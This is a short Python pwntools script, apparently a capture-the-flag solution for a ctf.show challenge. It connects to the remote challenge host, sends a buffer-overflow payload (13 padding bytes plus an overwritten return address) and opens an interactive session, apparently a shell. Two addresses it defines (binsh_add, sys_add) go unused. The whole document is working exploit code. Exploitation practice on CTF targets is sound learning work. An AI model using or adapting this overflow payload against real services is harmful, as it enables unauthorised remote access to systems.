from pwn import *
binsh_add = 0x08048630
sys_add = 0x080482AA
sh=remote('pwn.challenge.ctf.show',28043)
payload='a'*(13)+p32(0x804850F).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()


